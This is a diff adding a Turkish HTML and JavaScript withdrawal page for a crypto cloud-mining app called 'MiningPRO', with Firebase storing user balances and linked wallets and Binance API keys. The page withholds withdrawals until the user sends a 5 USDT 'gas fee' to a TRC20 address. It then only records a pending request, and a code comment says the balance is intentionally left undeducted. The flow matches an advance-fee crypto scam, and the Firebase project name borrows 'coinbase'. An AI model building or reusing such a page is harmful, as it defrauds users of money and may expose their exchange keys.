@@ -1,0 +1,519 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>MiningPRO - Para Çekme</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"/>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700;800&display=swap" rel="stylesheet">
+<style>
+/* ========================================================================= */
+/* --- GENEL STİLLER VE TEMA --- */
+/* ========================================================================= */
+body, html{
+  margin:0; padding:0;
+  font-family: 'Poppins', sans-serif;
+  background: #0d1117;
+  color:#f4f4f4;
+  min-height:100vh;
+  padding-bottom: 70px; 
+}
+* { box-sizing: border-box; }
+.wrapper{
+  max-width:500px;
+  margin:15px auto;
+  padding:0 15px;
+}
+header{
+  background:#161b22;
+  padding:15px;
+  text-align:center;
+  font-size:26px;
+  font-weight:800;
+  color:#4cd964; /* Yeşil Başlık */
+  text-shadow: 0 0 10px rgba(76, 217, 100, 0.4);
+  box-shadow:0 3px 15px rgba(0,0,0,0.8);
+  position:sticky;
+  top:0;
+  z-index:100;
+  border-bottom: 1px solid #4cd964;
+}
+.card{
+  background:#161b22;
+  border-radius:12px;
+  padding:20px;
+  margin-bottom:20px;
+  box-shadow:0 6px 20px rgba(0,0,0,0.5);
+  border: 1px solid #2d333b;
+}
+.card h2 {
+    color: #4cd964;
+    font-size: 20px;
+    margin-bottom: 15px;
+    border-bottom: 1px dashed #2d333b;
+    padding-bottom: 10px;
+}
+
+/* --- TOAST UYARI STİLİ --- */
+#toastMessage {
+    position: fixed; top: -100px; left: 50%; transform: translateX(-50%); width: 90%; max-width: 450px;
+    padding: 15px 20px; border-radius: 10px; font-weight: 700; text-align: center;
+    box-shadow: 0 4px 15px rgba(0, 0, 0, 0.7); z-index: 200; transition: top 0.5s ease-in-out;
+}
+#toastMessage.show { top: 20px; }
+#toastMessage.error { background: #420d0d; color: #e34c4c; border: 1px solid #e34c4c; }
+#toastMessage.success { background: #0d421d; color: #4cd964; border: 1px solid #4cd964; }
+#toastMessage.info { background: #191c42; color: #00bfff; border: 1px solid #00bfff; }
+
+
+/* --- FORMLAR --- */
+label {
+    display: block;
+    margin-top: 15px;
+    margin-bottom: 8px;
+    font-weight: 600;
+    color: #ccc;
+    font-size: 14px;
+}
+input[type="number"], select {
+    width: 100%;
+    padding: 12px;
+    border-radius: 8px;
+    border: 1px solid #2d333b;
+    background: #0d1117;
+    color: #f4f4f4;
+    font-size: 15px;
+}
+select option { background: #161b22; }
+
+/* --- ÇEKİM BUTONLARI --- */
+.action-button {
+    background: #4cd964;
+    color: #0d1117;
+    width: 100%;
+    padding: 15px;
+    border: none;
+    border-radius: 10px;
+    font-weight: 700;
+    font-size: 18px;
+    margin-top: 25px;
+    transition: 0.3s;
+    box-shadow: 0 4px 10px rgba(0,0,0,0.4);
+}
+.action-button:hover { background: #3ac052; }
+.action-button:disabled { background: #2d333b; color: #777; cursor: not-allowed; }
+
+#payGasFeeBtn {
+    background: #f3ba2f; /* Ödeme butonu farklı renkte */
+    color: #0d1117;
+}
+#payGasFeeBtn:hover { background: #ffc73a; }
+
+/* --- ÖZET KUTUSU --- */
+.summary-box {
+    background: #161b22;
+    border-radius: 10px;
+    padding: 15px;
+    margin-top: 20px;
+    border: 1px solid #00bfff;
+}
+.summary-box div {
+    display: flex;
+    justify-content: space-between;
+    padding: 5px 0;
+    border-bottom: 1px dashed #2d333b;
+}
+.summary-box div:last-child {
+    border-bottom: none;
+    font-weight: 700;
+    color: #4cd964;
+    font-size: 16px;
+    margin-top: 5px;
+}
+.summary-box .fee { color: #e34c4c; }
+.summary-box .label { color: #ccc; }
+
+/* --- GAS ÖDEME ALANI --- */
+#gasFeePaymentArea {
+    background: #420d0d;
+    border: 2px solid #e34c4c;
+    padding: 20px;
+    border-radius: 12px;
+    margin-top: 25px;
+    text-align: center;
+    display: none; /* Başlangıçta gizli */
+}
+#gasFeePaymentArea h3 {
+    color: #e34c4c;
+    margin-top: 0;
+}
+#gasFeePaymentArea .address-display {
+    background: #0d1117;
+    padding: 10px;
+    border-radius: 8px;
+    word-break: break-all;
+    font-size: 14px;
+    color: #4cd964;
+    border: 1px solid #2d333b;
+    margin-top: 10px;
+}
+
+/* ========================================================================= */
+/* --- ALT MENÜ --- */
+/* ========================================================================= */
+.bottom-menu { 
+    position:fixed; bottom:0; left:0; width:100%; display:flex; justify-content:space-around;
+    background:#161b22; padding:10px 0; box-shadow:0 -5px 15px rgba(0,0,0,0.5); z-index:99;
+    border-top: 1px solid #2d333b;
+}
+.bottom-menu a {
+    flex:1; text-decoration: none; text-align: center; margin:0 5px; padding:8px 0;
+    font-size:12px; background:transparent; color:#777; border-radius:8px; transition:.3s;
+    font-weight: 600;
+}
+.bottom-menu a i { font-size: 20px; display: block; margin-bottom: 4px; }
+.bottom-menu a.active { 
+    color:#f3ba2f; 
+    background: rgba(243, 186, 47, 0.1); 
+    text-shadow: 0 0 5px rgba(243, 186, 47, 0.6);
+}
+
+</style>
+</head>
+<body>
+
+<div id="toastMessage"></div>
+
+<header><i class="fas fa-hand-holding-usd"></i> Para Çekme İşlemi</header>
+
+<div class="wrapper">
+
+    <div class="card">
+        <h2>💵 Çekim Detayları</h2>
+
+        <div style="text-align:center; font-size:18px; margin-bottom:15px; font-weight:700; color:#00bfff;">
+            Mevcut Çekilebilir Bakiye: <span id="maxBalanceDisplay">0.00 USDT</span>
+        </div>
+
+        <label for="currencySelect">Çekilecek Kripto Para:</label>
+        <select id="currencySelect" onchange="updateWithdrawalDetails()">
+            <option value="USDT">Tether (USDT)</option>
+        </select>
+        
+        <label for="amountInput">Çekim Miktarı (USDT):</label>
+        <input type="number" id="amountInput" placeholder="Minimum 20.00 USDT" step="1" min="20" oninput="updateWithdrawalDetails()">
+        <button onclick="setMaxAmount()" style="background:#f3ba2f; color:#0d1117; padding:8px; border:none; border-radius:5px; margin-top:5px; width:100%; font-weight:600;">MAX Miktarı Kullan</button>
+        
+        <label for="connectionSelect">Gönderilecek Hesap/Cüzdan:</label>
+        <select id="connectionSelect" onchange="updateWithdrawalDetails()">
+             <option value="">Lütfen bağlı bir hesap seçin</option>
+        </select>
+
+    </div>
+    
+    <div class="card">
+        <h2>📝 İşlem Özeti</h2>
+        
+        <div class="summary-box">
+            <div><span class="label">Çekim Miktarı (USDT):</span> <span id="summaryAmount">0.00 USDT</span></div>
+            <div><span class="label">Gas/İşlem Ücreti (Yatırılacak):</span> <span id="summaryFee" class="fee">5.00 USDT</span></div>
+            <div><span class="label">Toplam Bakiye Kesintisi:</span> <span id="summaryTotal">0.00 USDT</span></div>
+            
+            <div style="margin-top:10px;"><span class="label">Alınacak Tutar:</span> <span id="summaryReceived">0.00 USDT</span></div>
+        </div>
+        
+        <button id="preWithdrawalBtn" class="action-button" disabled onclick="initiateGasPayment()">
+            <i class="fas fa-paper-plane"></i> Çekimi Başlat (Minimum 20.00 USDT)
+        </button>
+
+        <p id="withdrawalMessage" style="margin-top:15px; text-align:center; font-weight:600; color:#e34c4c;"></p>
+    </div>
+
+    <div id="gasFeePaymentArea">
+        <h3><i class="fas fa-exclamation-triangle"></i> Lütfen Gas Ücretini Yatırın!</h3>
+        <p style="color:#f4f4f4;">Çekim talebinizin işleme alınması için **5.00 USDT** tutarındaki Gas Ücretini aşağıdaki **USDT TRC20** adrese yatırmanız gerekmektedir.</p>
+        
+        <label>Yatırılacak Miktar (USDT TRC20):</label>
+        <div class="address-display" style="font-size: 16px; color: #f3ba2f;">5.00 USDT</div>
+        
+        <label>Ödeme Yapılacak Adres (USDT TRC20):</label>
+        <div class="address-display" id="gasFeeAddressDisplay">T9uN8tQkP4jZ1yX7oV6rE3bW2aL0sI5hG1fE</div>
+        
+        <button onclick="copyAddress()" style="background:#00bfff; color:#0d1117; padding:8px; border:none; border-radius:5px; margin-top:10px; width:100%; font-weight:600;">Adresi Kopyala</button>
+
+        <button id="confirmWithdrawalBtn" class="action-button" style="margin-top: 20px;" onclick="confirmWithdrawal()">
+            <i class="fas fa-check-circle"></i> Ödemeyi Yaptım & Çekim Talebini Oluştur
+        </button>
+        <small style="color:#ccc; display:block; margin-top:10px;">**NOT:** Ödeme yapıldıktan sonra bu butona basınız. Talebiniz **çekim taleplerim** kısmına yansıtılacaktır.</small>
+    </div>
+    
+</div>
+
+<div class="bottom-menu">
+  <a href="miningpro.html" id="tabMining"><i class="fas fa-tachometer-alt"></i> Kazım</a>
+  <a href="hizal.html" id="tabHizAl"><i class="fas fa-bolt"></i> Hız Al</a>
+  <a href="kazan.html" id="tabKazan"><i class="fas fa-trophy"></i> Kazan</a>
+  <a href="cüzdanım.html" id="tabWallet" class="active"><i class="fas fa-wallet"></i> Cüzdanım</a>
+</div>
+
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.5.0/firebase-app.js";
+import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.5.0/firebase-auth.js";
+import { getFirestore, doc, getDoc, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.5.0/firebase-firestore.js";
+
+// Sabitler
+const MIN_WITHDRAWAL_USDT = 20.00;
+const GAS_FEE_USDT = 5.00; // Sabit 5 USDT Gas Ücreti
+const GAS_FEE_TRC20_ADDRESS = "T9uN8tQkP4jZ1yX7oV6rE3bW2aL0sI5hG1fE"; // Örnek Gas Ücreti adresi
+
+// 🔥🔥🔥 LÜTFEN KENDİ FIREBASE AYARLARINIZLA DEĞİŞTİRİN 🔥🔥🔥
+const firebaseConfig = {
+  apiKey: "AIzaSyBwpgITzHh2K3oYTRDaNbGVexPR8IcqXBU",
+  authDomain: "coinbase-a1aca.firebaseapp.com",
+  projectId: "coinbase-a1aca",
+  storageBucket: "coinbase-a1aca.firebasestorage.app",
+  messagingSenderId: "596259885244",
+  appId: "1:596259885244:web:186df79a6ccdc96f0d00b9",
+  measurementId: "G-Q4SMPE62HF"
+};
+
+const app = initializeApp(firebaseConfig);
+const auth = getAuth();
+const db = getFirestore();
+
+let currentUser = null;
+let userData = null;
+let maxUsdtBalance = 0; // Sadece USDT bakiyesini tutacak şekilde güncellendi
+
+// DOM Elementleri
+const maxBalanceDisplayEl = document.getElementById('maxBalanceDisplay');
+const connectionSelectEl = document.getElementById('connectionSelect');
+const amountInputEl = document.getElementById('amountInput');
+const summaryAmountEl = document.getElementById('summaryAmount');
+const summaryFeeEl = document.getElementById('summaryFee');
+const summaryTotalEl = document.getElementById('summaryTotal');
+const summaryReceivedEl = document.getElementById('summaryReceived');
+const preWithdrawalBtn = document.getElementById('preWithdrawalBtn'); 
+const gasFeePaymentAreaEl = document.getElementById('gasFeePaymentArea');
+const withdrawalMessageEl = document.getElementById('withdrawalMessage');
+const messageEl = document.getElementById('toastMessage');
+const gasFeeAddressDisplayEl = document.getElementById('gasFeeAddressDisplay');
+const confirmWithdrawalBtn = document.getElementById('confirmWithdrawalBtn'); 
+
+
+// =========================================================================
+// --- FIREBASE BAĞLANTI & VERİ ÇEKME ---
+// =========================================================================
+
+onAuthStateChanged(auth, async (user) => {
+    if (user) {
+        currentUser = user;
+        await loadUserData(user.uid);
+        gasFeeAddressDisplayEl.innerText = GAS_FEE_TRC20_ADDRESS;
+    } else {
+        showToast('Oturum açılmadı. Yönlendiriliyorsunuz...', 'error');
+        setTimeout(() => { window.location.href = "index.html"; }, 3000); 
+    }
+});
+
+async function loadUserData(uid) {
+    const docRef = doc(db, "users", uid);
+    try {
+        const docSnap = await getDoc(docRef);
+        if (docSnap.exists()) {
+            userData = docSnap.data();
+            
+            // mainBalance objesinin varlığını kontrol et
+            if (!userData.mainBalance) userData.mainBalance = { USDT: 0 }; 
+            if (!userData.connections) userData.connections = []; 
+
+            calculateMaxBalance();
+            renderConnections();
+            updateWithdrawalDetails();
+
+        } else {
+            showToast('Kullanıcı verisi bulunamadı. Lütfen tekrar deneyin.', 'error');
+        }
+    } catch (e) {
+        showToast(`Veri yükleme hatası: ${e.message}`, 'error');
+        console.error("Veri yükleme hatası:", e);
+    }
+}
+
+function calculateMaxBalance() {
+    // Sadece USDT bakiyesini oku
+    maxUsdtBalance = parseFloat(userData.mainBalance.USDT || 0);
+    maxBalanceDisplayEl.innerText = `${maxUsdtBalance.toFixed(2)} USDT`;
+}
+
+function renderConnections() {
+    connectionSelectEl.innerHTML = '<option value="">Lütfen bağlı bir hesap seçin</option>';
+    if (userData.connections && userData.connections.length > 0) {
+        userData.connections.forEach((conn, index) => {
+            let displayValue = "";
+            if (conn.type === 'web3Addr') {
+                displayValue = conn.address.substring(0, 15) + '... (TRC20 Adres)';
+            } else if (conn.type === 'binance') {
+                displayValue = conn.apiKey.substring(0, 15) + '... (Binance API)';
+            } else {
+                 displayValue = conn.type; 
+            }
+
+            const optionText = `${conn.type.toUpperCase().replace('WEB3', 'CÜZDAN')} - ${displayValue}`;
+            connectionSelectEl.innerHTML += `<option value="${index}" data-type="${conn.type}">${optionText}</option>`;
+        });
+    } else {
+         withdrawalMessageEl.innerText = "Hata: Para çekimi için cüzdanınıza en az bir hesap bağlayın.";
+         preWithdrawalBtn.disabled = true;
+         showToast("Hata: Para çekimi için önce bir hesap bağlayın!", 'error');
+    }
+}
+
+// =========================================================================
+// --- UYARI VE DETAY GÜNCELLEME FONKSİYONLARI ---
+// =========================================================================
+
+function showToast(text, type = 'error') {
+    messageEl.innerHTML = text;
+    messageEl.className = ''; 
+    messageEl.classList.add(type, 'show');
+    setTimeout(() => { messageEl.classList.remove('show'); }, 5000); 
+}
+
+window.copyAddress = function() {
+    navigator.clipboard.writeText(GAS_FEE_TRC20_ADDRESS);
+    showToast("Gas ücreti adresi panoya kopyalandı!", 'info');
+}
+
+window.setMaxAmount = function() {
+    // Çekilebilecek maksimum bakiye (USDT)
+    const available = maxUsdtBalance; 
+    
+    if (available >= MIN_WITHDRAWAL_USDT) {
+        // En yakın tam miktara yuvarla (Örn: 123.456 -> 123.45)
+        amountInputEl.value = Math.floor(available * 100) / 100;
+    } else {
+        amountInputEl.value = available.toFixed(2); 
+    }
+    updateWithdrawalDetails();
+}
+
+window.updateWithdrawalDetails = function() {
+    // Tüm hesaplamalar artık USDT cinsinden
+    const requestedUsdt = parseFloat(amountInputEl.value) || 0;
+    const selectedConnection = connectionSelectEl.value;
+    
+    let isValid = true;
+    let message = '';
+    
+    // Gas ödeme alanını gizle ve butonu göster
+    gasFeePaymentAreaEl.style.display = 'none';
+    preWithdrawalBtn.style.display = 'block';
+
+    preWithdrawalBtn.disabled = true;
+    preWithdrawalBtn.innerText = `Çekimi Başlat (Minimum ${MIN_WITHDRAWAL_USDT.toFixed(2)} USDT)`;
+    withdrawalMessageEl.innerText = '';
+
+    if (selectedConnection === "") {
+        message = 'Lütfen para göndermek için bir hesap seçin.';
+        isValid = false;
+    } 
+    
+    if (requestedUsdt < MIN_WITHDRAWAL_USDT) {
+        message = `Minimum çekim miktarı ${MIN_WITHDRAWAL_USDT.toFixed(2)} USDT'dir.`;
+        isValid = false;
+    }
+
+    // Yeterli bakiye kontrolü
+    if (requestedUsdt > maxUsdtBalance) {
+        message = `Yetersiz bakiye! Çekim için ${requestedUsdt.toFixed(2)} USDT gerekli. Mevcut: ${maxUsdtBalance.toFixed(2)} USDT.`;
+        isValid = false;
+    }
+    
+    // Özeti güncelle
+    summaryAmountEl.innerText = requestedUsdt.toFixed(2) + " USDT";
+    summaryFeeEl.innerText = GAS_FEE_USDT.toFixed(2) + " USDT";
+    
+    // Toplam bakiye kesintisi 0.00 USDT (Gas ücreti ayrı yatırılıyor)
+    summaryTotalEl.innerText = "0.00 USDT"; 
+    summaryReceivedEl.innerText = `${requestedUsdt.toFixed(2)} USDT`;
+
+
+    if (isValid) {
+        preWithdrawalBtn.disabled = false;
+        preWithdrawalBtn.innerText = `Çekimi Başlat (${requestedUsdt.toFixed(2)} USDT)`;
+        withdrawalMessageEl.innerText = '';
+    } else {
+        withdrawalMessageEl.innerText = message;
+    }
+};
+
+// =========================================================================
+// --- ÇEKİM AŞAMALARI ---
+// =========================================================================
+
+window.initiateGasPayment = function() {
+    // Kontrollerden geçti. Şimdi Gas ödeme ekranını göster.
+    gasFeePaymentAreaEl.style.display = 'block';
+    preWithdrawalBtn.style.display = 'none';
+    withdrawalMessageEl.innerText = "Lütfen Gas ücreti ödemesini yapıp 'Ödemeyi Yaptım' butonuna tıklayınız.";
+    
+    // Sayfanın en altına kaydır 
+    gasFeePaymentAreaEl.scrollIntoView({ behavior: 'smooth' });
+}
+
+window.confirmWithdrawal = async function() {
+    const requestedUsdt = parseFloat(amountInputEl.value);
+    const selectedIndex = connectionSelectEl.value;
+
+    if (!currentUser || requestedUsdt < MIN_WITHDRAWAL_USDT || selectedIndex === "") {
+        showToast("Lütfen tüm alanları kontrol edin ve Gas ücretini yatırdığınızdan emin olun.", 'error');
+        return;
+    }
+
+    // İşlem görseli
+    const confirmBtn = document.getElementById('confirmWithdrawalBtn');
+    confirmBtn.disabled = true;
+    confirmBtn.innerText = "Çekim Talebiniz Oluşturuluyor...";
+
+    try {
+        const selectedConnection = userData.connections[selectedIndex];
+        
+        // 1. Çekim Talebini Kaydet (çekim taleplerim koleksiyonuna yansıt)
+        const withdrawalRequest = {
+            userId: currentUser.uid,
+            amountUsdt: requestedUsdt,
+            targetConnection: selectedConnection,
+            status: 'Gas Ödendi Onayı Bekleniyor', 
+            timestamp: serverTimestamp(),
+            gasFeeRequired: GAS_FEE_USDT,
+            receivedAmount: requestedUsdt,
+        };
+        
+        await addDoc(collection(db, "cekimetalepleri"), withdrawalRequest);
+
+        // **DİKKAT: BAKİYE DÜŞÜMÜ YAPILMADI!**
+        // İstek üzerine bakiye düşümü (mainBalance.USDT'den çıkarma) bu aşamada yapılmadı.
+
+        showToast(`✅ Çekim Talebi Başarıyla Oluşturuldu! ${requestedUsdt.toFixed(2)} USDT talebiniz işleme alındı. Durum: Gas Ödemesi Kontrol Ediliyor.`, 'success');
+        
+        // Alanları temizle ve sıfırla
+        amountInputEl.value = 0;
+        calculateMaxBalance(); // Bakiyeyi yeniden oku ve güncelle
+        updateWithdrawalDetails(); 
+        
+        // Butonları sıfırla
+        confirmBtn.innerText = "Ödemeyi Yaptım & Çekim Talebini Oluştur";
+        confirmBtn.disabled = false;
+        gasFeePaymentAreaEl.style.display = 'none';
+        
+    } catch (e) {
+        showToast(`❌ Çekim işlemi sırasında hata oluştu: ${e.message}`, 'error');
+        confirmBtn.disabled = false;
+        confirmBtn.innerText = "Ödemeyi Yaptım & Çekim Talebini Oluştur (Hata)";
+        console.error("Çekim Hatası:", e);
+    }
+}
+</script>
+</body>
+</html>
